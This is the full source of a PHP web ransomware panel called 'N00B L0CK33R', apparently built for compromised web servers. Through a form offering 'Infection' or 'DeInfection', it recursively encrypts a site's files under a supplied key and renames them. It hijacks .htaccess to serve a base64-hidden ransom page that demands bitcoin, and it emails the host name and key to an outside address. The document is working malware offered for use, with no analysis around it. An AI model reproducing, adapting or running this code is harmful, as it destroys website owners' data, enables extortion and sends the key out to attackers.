<!DOCTYPE html>
<html>
<head>
   <title>N00B L0CK33R</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border-style: dotted;
    border-color: #379600;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: green;
    background-color: transparent;
    color: green;
}
.submite{
       border-style: dotted;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".n00bcut")){
      rename(".htaccess", ".n00bcut");
      if(fwrite(fopen('.htaccess', 'w'), "#N00b Team\r\nDirectoryIndex n00b.php\r\nErrorDocument 404 /n00b.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("n00b.php", base64_decode("CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgIDx0aXRsZT5JTkZFQ1RFRCBCWSBOMDBCIEwwQ0szUjwvdGl0bGU+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CmJvZHkgewogICAgYmFja2dyb3VuZDogIzAwMDAwMDsKICAgIGNvbG9yOiAjZTJlMmUyOwp9CmF7CiAgIGNvbG9yOmdyZWVuOwp9Cjwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CjxjZW50ZXI+CjxwcmU+CiAgICAgIAo4ODhiICAgIDg4OCAuZDg4ODhiLiAgLmQ4ODg4Yi4gODg4ODg4Yi4gICAgIDg4OCAgICAgIC5kODg4OGIuICAuZDg4ODhiLiA4ODggICAgZDhQICAuZDg4ODhiLiA4ODg4ODg4Yi4gCjg4ODhiICAgODg4ZDg4UCAgWTg4YmQ4OFAgIFk4OGI4ODggICI4OGIgICAgODg4ICAgICBkODhQICBZODhiZDg4UCAgWTg4Yjg4OCAgIGQ4UCAgZDg4UCAgWTg4Yjg4OCAgIFk4OGIKODg4ODhiICA4ODg4ODggICAgODg4ODg4ICAgIDg4ODg4OCAgLjg4UCAgICA4ODggICAgIDg4OCAgICA4ODg4ODggICAgODg4ODg4ICBkOFAgICAgICAgIC5kODhQODg4ICAgIDg4OAo4ODhZODhiIDg4ODg4OCAgICA4ODg4ODggICAgODg4ODg4ODg4OEsuICAgIDg4OCAgICAgODg4ICAgIDg4ODg4OCAgICAgICA4ODhkODhLICAgICAgICA4ODg4IiA4ODggICBkODhQCjg4OCBZODhiODg4ODg4ICAgIDg4ODg4OCAgICA4ODg4ODggICJZODhiICAgODg4ICAgICA4ODggICAgODg4ODg4ICAgICAgIDg4ODg4ODhiICAgICAgICAiWThiLjg4ODg4ODhQIiAKODg4ICBZODg4ODg4ODggICAgODg4ODg4ICAgIDg4ODg4OCAgICA4ODggICA4ODggICAgIDg4OCAgICA4ODg4ODggICAgODg4ODg4ICBZODhiICA4ODggICAgODg4ODg4IFQ4OGIgIAo4ODggICBZODg4OFk4OGIgIGQ4OFBZODhiICBkODhQODg4ICAgZDg4UCAgIDg4OCAgICAgWTg4YiAgZDg4UFk4OGIgIGQ4OFA4ODggICBZODhiIFk4OGIgIGQ4OFA4ODggIFQ4OGIgCjg4OCAgICBZODg4ICJZODg4OFAiICAiWTg4ODhQIiA4ODg4ODg4UCIgICAgODg4ODg4ODggIlk4ODg4UCIgICJZODg4OFAiIDg4OCAgICBZODhiICJZODg4OFAiIDg4OCAgIFQ4OGIKCgo8YnI+SSBBTSBOMDBCSVRBIHx8IAogICAgQ09OR1JBVFVMQVRJT05TIEFMTCBZT1VSIEZJTEVTIEhBUyBCRUVOIEVOQ1JZUFRFRCBCWSA8Zm9udCBjb2xvcj0icmVkIj5OMDBCIEwwQ0szUiBSQU5TT01XQVJFLjwvZm9udD4gPC9icj4KPGNlbnRlcj4gQ09OVEFDVCBVUyBPTiAKICAgICAtWyA8Zm9udCBjb2xvcj0iZ3JlZW4iPkJNLTJjWHZWdnY0VExVM0wyYTM4R29BM3MyWnZjenRxQVlrR05AYml0bWVzc2FnZS5jaDwvZm9udD4gXS0KICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgPGVtYmVkIHNyYz0iaHR0cHM6Ly93d3cueW91dHViZS5jb20vdi9oTUJLbVFFUE56SSZhdXRvcGxheT0xIiB0eXBlPSJhcHBsaWNhdGlvbi94LXNob2Nrd2F2ZS1mbGFzaCIgd21vZGU9InRyYW5zcGFyZW50IiB3aWR0aD0iMCIgaGVpZ2h0PSIwIj48L2VtYmVkPgogICAKICAgPHA+CiAgIDxmb250IGNvbG9yPSJXaGl0ZSI+CiAgIDxmb250IHNpemU9NXB4PgogICBJIGFsbW9zdCB1bmRlcnN0YW5kLCBidXQgd2hhdCBkbyBJIGhhdmUgdG8gZG8/IDxicj4KVGhlIGZpcnN0IHRoaW5nIHlvdSBzaG91bGQgZG8gaXMgdG8gcmVhZCB0aGUgaW5zdHJ1Y3Rpb25zIHRvIGVuZC48YnI+IApZb3VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZXMgd2l0aCB0aGUgPGZvbnQgY29sb3I9InJlZCI+TjAwQiBMMENLM1IgUkFOU09NV0FSRS48L2ZvbnQ+IApMZXQgbWUgdGVsbCB5b3UgZmlyc3QuLi4gR09PR0xFIERPTidUIGtub3cgVVMuIApUaGluayBsb2dpY2FsbHkgLSB3ZSBhcmUgdGhlIG9uZXMgd2hvIGhhdmUgbG9ja2VkIHlvdXIgZmlsZXMgYW5kIHRoZSBvbmx5IG9uZXMgd2hvIGNhbiBkZWNyeXB0IHlvdXIgZmlsZXMuIAo8Zm9udCBjb2xvcj0icmVkIj5BbnkgYXR0ZW1wdHMgdG8gcmVzdG9yZSB5b3VyIGZpbGVzIHdpdGggdGhpcmQtcGFydHkgc29mdHdhcmUgb3IgdG9vbHMgY2FuIGJlIGZhdGFsIGZvciB5b3VyIGVuY3J5cHRlZCBmaWxlcy48L2ZvbnQ+ClRoZSBmYWN0IG9mIHRoZSBtYXR0ZXIgaXMgdGhhdCBjaGFuZ2luZyB0aGUgZGF0YSB3aXRoaW4gdGhlIGVuY3J5cHRlZCBmaWxlcywgYXMgMTAwJSBvZiBmaWxlIHJlc3RvcmF0aW9uIHNvZnR3YXJlIGFuZCB0b29scyBkbywgPGJyPndpbGwgaXJyZXZvY2FibHkgYnJlYWsgeW91ciBmaWxlcyBhbmQgbWFrZSB0aGVtIGlycmVjb3ZlcmFibGUuIE9ubHkgb3VyIHNwZWNpYWwgc29mdHdhcmUgY2FuIHJlc3RvcmUgeW91ciBmaWxlcy4KPGZvbnQgY29sb3I9ImdyZWVuIj4KPHA+RGVjcnlwdGlvbiBrZXkgaXMgc3RvcmVkIG9uIGEgc2VjcmV0IEludGVybmV0IHNlcnZlciBhbmQgPGI+bm9ib2R5PC9iPiBjYW4gZGVjcnlwdCB5b3VyIGZpbGVzIHVudGlsIHlvdSBwYXkgMC4zMDU0IEJUQyAoMjAwJClhbmQgb2J0YWluIHRoZSBkZWNyeXB0aW9uIGtleS48L3A+IFdlIGNyZWF0ZWQgZm9yIHlvdSB0aGlzIGJpdGNvaW4gYWRkcmVzcyA8Zm9udCBjb2xvcj0icmVkIj4xTFNUTDRHbUVTWnFwYVZjeGloUUpTejQ3N3A5TGdWMWM8L2ZvbnQ+PC9wPgo8Zm9udCBjb2xvcj1yZWQiPgpEbyBub3QgdHJ5IHRvIGNoZWF0IHRoZSBzeXN0ZW0sIGVkaXQgZW5jcnlwdGVkIGZpbGVzLCBlZGl0IGludGVybmFsIGZpbGVzIG9yIGRlbGV0ZSBhbnkgZmlsZS4gPGJyPlRoaXMgd2lsbCByZXN1bHQgaW4gdGhlIGluYWJpbGl0eSB0byByZWNvdmVyIHlvdXIgZGF0YSwgYW5kIHdlIGNhbiBub3QgaGVscCB5b3UuIDxicj5Pbmx5IHdheSB0byBrZWVwIHlvdXIgZmlsZXMgaXMgdG8gZm9sbG93IHRoZSBpbnN0cnVjdGlvbgo8L2ZvbnQ+CjwvZm9udD48L2ZvbnQ+CjwvcD4="))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  n00b.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){
      if( file_exists(".n00bcut") ){
        if( unlink(".htaccess") && unlink("n00b.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> n00b.php (Default Page)<br>';
        }
        rename(".n00bcut", ".htaccess");
      }
   }
   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"n00bl0ck.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"n00b.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".n00bcut") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }
   public function report($key){
        $message.= "=========     Details    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= EOF =========\n";
        $subject = "Report Ransomeware";
        $ducker = "secbreacher@gmail.com";
		$headers = "From: Ransomware <ransomeware@n00b.today>\r\n";
        mail($ducker,$subject,$message,$headers);
   }
   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".n00b");
        break;
        case '2':
          $locates = str_replace(".n00b", "", $locate);
          rename($locate, $locates);
        break;
      }
   }
   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );
      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }
   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }
   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}
if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<pre>
<center><h1> Command Portal</h1><br></br><br></br><br></br>
<h2> by : N00BITA</h2>
    
</pre>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
      <select name="method" class="selecte">
         <option value="1">Infection</option>
         <option value="2">DeInfection</option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
<?php
}?>
</div>
</body>
</html>


<?php
?>
